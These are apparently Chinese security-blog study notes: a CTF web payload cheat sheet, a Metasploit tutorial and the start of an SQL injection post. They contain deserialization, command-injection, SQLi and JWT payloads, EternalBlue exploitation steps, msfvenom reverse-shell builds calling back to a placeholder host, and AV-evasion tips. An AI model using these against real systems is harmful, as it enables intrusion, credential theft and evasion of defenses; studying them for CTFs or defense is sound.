+<h3 id="5-反序列化（PHP）"><a href="#5-反序列化（PHP）" class="headerlink" title="5. 反序列化（PHP）"></a>5. 反序列化（PHP）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A);  <span class="comment">// O:1:&quot;A&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造 payload 改 cmd：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过技巧：</p>
+<ul>
+<li>反斜杠绕过 <code>O:1:&quot;A&quot;</code> → <code>O:1:&quot;\41&quot;</code></li>
+<li>私有属性 <code>\x00ClassName\x00member</code>（hex 编码）</li>
+<li>phar 反序列化：<code>phar://shell.phar</code></li>
+</ul>
+<h3 id="6-命令注入"><a href="#6-命令注入" class="headerlink" title="6. 命令注入"></a>6. 命令注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用分隔符</span></span><br><span class="line">cmd; cmd2</span><br><span class="line">cmd | cmd2</span><br><span class="line">cmd || cmd2</span><br><span class="line">cmd &amp;&amp; cmd2</span><br><span class="line">cmd &amp; cmd2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过空格</span></span><br><span class="line"><span class="built_in">ls</span><span class="variable">$&#123;IFS&#125;</span>+<span class="built_in">cat</span></span><br><span class="line"><span class="built_in">ls</span><span class="variable">$IFS</span></span><br><span class="line">&#123;<span class="built_in">ls</span>,-la&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过关键字</span></span><br><span class="line">ca<span class="string">&#x27;&#x27;</span>t /etc/passwd     <span class="comment"># 空字符串拼接</span></span><br><span class="line">ca\t /etc/passwd      <span class="comment"># 反斜杠</span></span><br><span class="line">ca<span class="string">&quot;&quot;</span>t /etc/passwd</span><br><span class="line"><span class="built_in">echo</span> Y2F0IC9ldGMvcGFzc3dk | <span class="built_in">base64</span> -d | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过 WAF（PHP）</span></span><br><span class="line">system(<span class="string">&quot;cat /etc/passwd&quot;</span>)  →  passthru(<span class="string">&#x27;c&#x27;</span>.<span class="string">&#x27;at /etc/passwd&#x27;</span>)</span><br><span class="line">system(<span class="string">&quot;cat /etc/passwd&quot;</span>)  →  (system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-SQL-注入变体"><a href="#7-SQL-注入变体" class="headerlink" title="7. SQL 注入变体"></a>7. SQL 注入变体</h3><ul>
+<li><strong>CTF 经典 trick</strong>：无列名注入（用 <code>join</code> + <code>using</code>）</li>
+<li><strong>异或注入</strong>：<code>id=1^(select(substr(database(),1,1))=s)</code></li>
+<li><strong>JSON 注入</strong>：<code>&#123;&quot;id&quot;:&quot;1 union select 1--&quot;&#125;</code></li>
+<li><strong>updatexml 报错</strong></li>
+<li><strong>预编译绕过</strong>：<code>set @sql=...;prepare stmt from @sql;execute stmt;</code></li>
+</ul>
+<h3 id="8-JWT-攻击"><a href="#8-JWT-攻击" class="headerlink" title="8. JWT 攻击"></a>8. JWT 攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Header 改 alg=none</span><br><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">eyJhbGc...</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"># 暴力破解 HS256</span><br><span class="line">hashcat -m 16500 jwt.txt rockyou.txt</span><br><span class="line"></span><br><span class="line"># alg=HS256 → RS256 混淆</span><br><span class="line">用 HS256 用公钥当 secret 签</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-NodeJS-原型链污染"><a href="#9-NodeJS-原型链污染" class="headerlink" title="9. NodeJS 原型链污染"></a>9. NodeJS 原型链污染</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment">// 走 __proto__ / constructor.prototype</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-Python-pickle"><a href="#10-Python-pickle" class="headerlink" title="10. Python pickle"></a>10. Python pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;cat /flag&#x27;</span>,))</span><br><span class="line">payload = pickle.dumps(P())</span><br><span class="line"><span class="comment"># base64 后送进接口</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-必装工具"><a href="#0x03-必装工具" class="headerlink" title="0x03 必装工具"></a>0x03 必装工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>BurpSuite</td>
+<td>抓包 &#x2F; Repeater &#x2F; Intruder</td>
+</tr>
+<tr>
+<td>sqlmap</td>
+<td>自动化 SQL 注入</td>
+</tr>
+<tr>
+<td>ffuf</td>
+<td>目录爆破 &#x2F; 参数 fuzz</td>
+</tr>
+<tr>
+<td>dirsearch</td>
+<td>目录扫描</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a></td>
+<td>PHP 反序列化链生成</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></td>
+<td>Java 反序列化链生成</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a></td>
+<td>SSTI 自动化</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></td>
+<td>JWT 攻击</td>
+</tr>
+<tr>
+<td>hashcat &#x2F; john</td>
+<td>哈希爆破</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki">pwn_sandbox</a></td>
+<td>沙箱逃逸资料</td>
+</tr>
+</tbody></table>
+<h2 id="0x04-训练平台"><a href="#0x04-训练平台" class="headerlink" title="0x04 训练平台"></a>0x04 训练平台</h2><table>
+<thead>
+<tr>
+<th>平台</th>
+<th>类型</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://www.ctfhub.com/">CTFHub</a></td>
+<td>综合</td>
+<td>国内题集大成</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a></td>
+<td>综合</td>
+<td>国内题库</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.nssctf.cn/">NSSCTF</a></td>
+<td>综合</td>
+<td>题量大</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://picoctf.org/">picoCTF</a></td>
+<td>入门</td>
+<td>CMU 出题</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.hackthebox.com/">HackTheBox</a></td>
+<td>实战化</td>
+<td>偏渗透</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.root-me.org/">Root Me</a></td>
+<td>综合</td>
+<td>法国经典</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://websec101.com/">Web Sec 101</a></td>
+<td>入门</td>
+<td>系统化</td>
+</tr>
+</tbody></table>
+<h2 id="0x05-解题流程建议"><a href="#0x05-解题流程建议" class="headerlink" title="0x05 解题流程建议"></a>0x05 解题流程建议</h2><ol>
+<li><strong>F12 看源码</strong>：注释、隐藏字段、JS</li>
+<li><strong>看 robots.txt &#x2F; .git &#x2F; .svn &#x2F; .DS_Store</strong></li>
+<li><strong>dirsearch 扫后台</strong></li>
+<li><strong>测试 SQL &#x2F; SSTI &#x2F; 文件读取 &#x2F; XSS</strong></li>
+<li><strong>抓包看接口</strong>：Repeater 调试参数</li>
+<li><strong>回显差时用 OOB</strong>：burp collaborator</li>
+<li><strong>看 cookie &#x2F; token</strong>：JWT 解码看 alg</li>
+<li><strong>从题目名 &#x2F; 描述 &#x2F; 注释里找 hint</strong></li>
+</ol>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>CTF Web 的考点其实不多，三十道题覆盖 80% 知识点。把每个题的漏洞原因 + 利用链 + 修复方案都吃透，比刷 200 道流水题有效得多。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/09/05/Metasploit%E5%9F%BA%E7%A1%80%E5%AE%9E%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/05/Metasploit%E5%9F%BA%E7%A1%80%E5%AE%9E%E6%88%98/" class="post-title-link" itemprop="url">Metasploit 基础实战笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-05 14:30:00" itemprop="dateCreated datePublished" datetime="2026-09-05T14:30:00+08:00">2026-09-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:08:55" itemprop="dateModified" datetime="2026-09-01T18:08:55+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>808</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Metasploit Framework（MSF）是渗透测试事实标准。本文梳理核心命令、模块分类、payload 生成与实战流程。仅用于合法授权环境。</p>
+<h2 id="0x01-模块分类"><a href="#0x01-模块分类" class="headerlink" title="0x01 模块分类"></a>0x01 模块分类</h2><table>
+<thead>
+<tr>
+<th>模块</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Exploit</td>
+<td>漏洞利用</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td>漏洞利用成功后执行的代码</td>
+</tr>
+<tr>
+<td>Auxiliary</td>
+<td>辅助模块（扫描、嗅探、Fuzz、密码爆破）</td>
+</tr>
+<tr>
+<td>Post</td>
+<td>后渗透模块（提权、信息收集）</td>
+</tr>
+<tr>
+<td>Encoder</td>
+<td>编码器，绕过 AV&#x2F;IDS</td>
+</tr>
+<tr>
+<td>Nops</td>
+<td>空指令，缓冲区对齐</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-核心命令"><a href="#0x02-核心命令" class="headerlink" title="0x02 核心命令"></a>0x02 核心命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfconsole             <span class="comment"># 启动</span></span><br><span class="line">msfupdate              <span class="comment"># 更新</span></span><br><span class="line">search ms17_010        <span class="comment"># 搜索</span></span><br><span class="line">info exploit/ms17_010  <span class="comment"># 查看模块详情</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show options           <span class="comment"># 看必需参数</span></span><br><span class="line">show payloads          <span class="comment"># 看可用 payload</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.10</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.5</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit / run</span><br></pre></td></tr></table></figure>
+
+<p>会话管理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessions -l              <span class="comment"># 列出所有会话</span></span><br><span class="line">sessions -i 1            <span class="comment"># 切到会话 1</span></span><br><span class="line">sessions -u 1            <span class="comment"># 升级到 Meterpreter</span></span><br><span class="line">background               <span class="comment"># 把当前会话丢后台</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-Meterpreter-常用命令"><a href="#0x03-Meterpreter-常用命令" class="headerlink" title="0x03 Meterpreter 常用命令"></a>0x03 Meterpreter 常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sysinfo                 <span class="comment"># 系统信息</span></span><br><span class="line">getuid                  <span class="comment"># 当前权限</span></span><br><span class="line">getsystem               <span class="comment"># 自动提权尝试</span></span><br><span class="line">hashdump                <span class="comment"># 抓密码哈希</span></span><br><span class="line">screenshot              <span class="comment"># 截屏</span></span><br><span class="line">keyscan_start           <span class="comment"># 键盘记录</span></span><br><span class="line">keyscan_dump</span><br><span class="line">download C:\\file.txt   <span class="comment"># 下载文件</span></span><br><span class="line">upload /opt/agent.exe C:\\  <span class="comment"># 上传文件</span></span><br><span class="line">portfwd add -l 8080 -p 80 -r 127.0.0.1  <span class="comment"># 端口转发</span></span><br><span class="line">route add 192.168.5.0 255.255.255.0 1   <span class="comment"># 加路由做内网代理</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-Payload-生成（msfvenom）"><a href="#0x04-Payload-生成（msfvenom）" class="headerlink" title="0x04 Payload 生成（msfvenom）"></a>0x04 Payload 生成（msfvenom）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows 反向 shell</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp \</span><br><span class="line">  LHOST=1.2.3.4 LPORT=4444 -f exe -o /tmp/shell.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 反弹</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp \</span><br><span class="line">  LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSP</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp \</span><br><span class="line">  LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">msfvenom -p python/meterpreter/reverse_tcp \</span><br><span class="line">  LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加编码免杀</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp \</span><br><span class="line">  LHOST=1.2.3.4 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-数据库与工作流"><a href="#0x05-数据库与工作流" class="headerlink" title="0x05 数据库与工作流"></a>0x05 数据库与工作流</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db_status               <span class="comment"># 看 PostgreSQL 状态</span></span><br><span class="line">workspace -a <span class="built_in">test</span>       <span class="comment"># 新建工作区</span></span><br><span class="line">db_nmap -A 192.168.1.0/24  <span class="comment"># 扫描结果入库</span></span><br><span class="line">hosts                   <span class="comment"># 看主机</span></span><br><span class="line">services                <span class="comment"># 看服务</span></span><br><span class="line">vulns                   <span class="comment"># 看漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p>发现漏洞后 <code>vulns</code> 列表对照 search 即可批量利用。</p>
+<h2 id="0x06-实战示例：EternalBlue"><a href="#0x06-实战示例：EternalBlue" class="headerlink" title="0x06 实战示例：EternalBlue"></a>0x06 实战示例：EternalBlue</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.10</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.5</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功后 Meterpreter 会话到手，跑 <code>sysinfo</code> 看是否 Win7 SP1 + MS17-010 未打补丁。</p>
+<h2 id="0x07-实战示例：Tomcat-弱口令"><a href="#0x07-实战示例：Tomcat-弱口令" class="headerlink" title="0x07 实战示例：Tomcat 弱口令"></a>0x07 实战示例：Tomcat 弱口令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.10</span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br><span class="line"><span class="built_in">set</span> USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>拿到账号后用 <code>exploit/multi/http/tomcat_mgr_deploy</code> 部署 war 拿 shell。</p>
+<h2 id="0x08-实战示例：PHP-CGI-远程执行"><a href="#0x08-实战示例：PHP-CGI-远程执行" class="headerlink" title="0x08 实战示例：PHP CGI 远程执行"></a>0x08 实战示例：PHP CGI 远程执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.10</span><br><span class="line"><span class="built_in">set</span> TARGETURI /php/</span><br><span class="line"><span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-后渗透常用模块"><a href="#0x09-后渗透常用模块" class="headerlink" title="0x09 后渗透常用模块"></a>0x09 后渗透常用模块</h2><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>post/windows/gather/hashdump</code></td>
+<td>抓 SAM 哈希</td>
+</tr>
+<tr>
+<td><code>post/multi/manage/shell_to_meterpreter</code></td>
+<td>普通 shell 升级 Meterpreter</td>
+</tr>
+<tr>
+<td><code>post/multi/recon/local_exp_suggester</code></td>
+<td>自动枚举提权建议</td>
+</tr>
+<tr>
+<td><code>post/windows/gather/credentials/credential_collector</code></td>
+<td>收集凭据</td>
+</tr>
+<tr>
+<td><code>post/multi/manage/migrate</code></td>
+<td>迁移进程到稳定进程</td>
+</tr>
+<tr>
+<td><code>post/windows/manage/persistence</code></td>
+<td>持久化</td>
+</tr>
+</tbody></table>
+<h2 id="0x10-免杀技巧"><a href="#0x10-免杀技巧" class="headerlink" title="0x10 免杀技巧"></a>0x10 免杀技巧</h2><ul>
+<li><strong>shikata_ga_nai + 多次迭代</strong>：经典编码器，可绕过部分 AV</li>
+<li><strong>自定义 payload</strong>：基于 stageless + 加密 stub</li>
+<li><strong>Veil Framework</strong>：生成免杀 payload</li>
+<li><strong>C# 模板 + AES 解密</strong>：Meterpreter stage 加密嵌入</li>
+<li><strong>流程注入</strong>：编译 native exe，运行时注入 shellcode</li>
+</ul>
+<h2 id="0x11-防御与检测"><a href="#0x11-防御与检测" class="headerlink" title="0x11 防御与检测"></a>0x11 防御与检测</h2><ul>
+<li>EDR 监控 <code>msfvenom</code> 生成 exe 的特征</li>
+<li>网络层 IDS 规则匹配 Meterpreter 通信</li>
+<li>限制出网：内部服务器只能经代理出网</li>
+<li>进程白名单（WDAC）</li>
+<li>启用 Defender 实时保护 + AMSI</li>
+</ul>
+<h2 id="0x12-总结"><a href="#0x12-总结" class="headerlink" title="0x12 总结"></a>0x12 总结</h2><p>MSF 是渗透的瑞士军刀。会用 search + info + show options 三板斧，再背几个常驻 payload，就能搞定 80% 的自动化利用工作。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/" class="post-title-link" itemprop="url">SQL 注入从入门到实战笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-28 14:20:00" itemprop="dateCreated datePublished" datetime="2026-08-28T14:20:00+08:00">2026-08-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 17:28:17" itemprop="dateModified" datetime="2026-09-01T17:28:17+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>584</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SQL 注入长期占据 OWASP Top10 头部位置，是 Web 渗透中最经典、杀伤力最强的漏洞之一。本文梳理基础原理、常见类型与实战 Payload，作为学习笔记存档。</p>
+<blockquote>
+<p>注：本文仅用于合法授权环境下的安全研究。</p>
+</blockquote>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>后端直接将用户输入拼接到 SQL 语句中，未做过滤或参数化，导致攻击者可以改变 SQL 语义。</p>
+<p>典型漏洞代码（PHP）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
